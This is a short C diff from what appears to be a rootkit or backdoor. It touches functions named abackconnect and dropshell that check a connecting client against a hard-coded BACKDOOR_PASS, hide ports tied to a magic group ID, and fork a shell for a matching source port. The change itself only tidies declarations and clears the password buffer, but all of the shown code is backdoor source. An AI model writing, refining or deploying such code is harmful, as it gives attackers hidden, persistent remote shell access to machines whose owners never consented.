@@ -5,11 +5,12 @@ void abackconnect(int sockfd){
     hook(CREAD, CCHDIR);
 
     send(sockfd, ": ", 2, 0);
-
     memset(tmp, 0, sizeof(tmp));
     call(CREAD, sockfd, tmp, sizeof(tmp)-1);
     tmp[strlen(tmp)-1]='\0';
     got_pw = !strcmp(crypt(tmp, BACKDOOR_PASS), BACKDOOR_PASS);
+    memset(tmp, 0, sizeof(tmp));
+
     if(!got_pw){
         shutdown(sockfd, SHUT_RDWR);
         close(sockfd);
@@ -43,10 +44,14 @@ int getacceptport(void){
 }
 
 int dropshell(int sockfd, struct sockaddr_in *sa_i, gid_t magicgid){
+    int accport, sport;
+
     preparehideports(magicgid);
-    int accport = getacceptport();
-    if(accport == 0) return sockfd;
-    int sport = htons(sa_i->sin_port);
+    accport = getacceptport();
+    if(accport == 0)
+        return sockfd;
+
+    sport = htons(sa_i->sin_port);
     if(sport == accport){
         pid_t pid = fork();
         if(pid == 0){
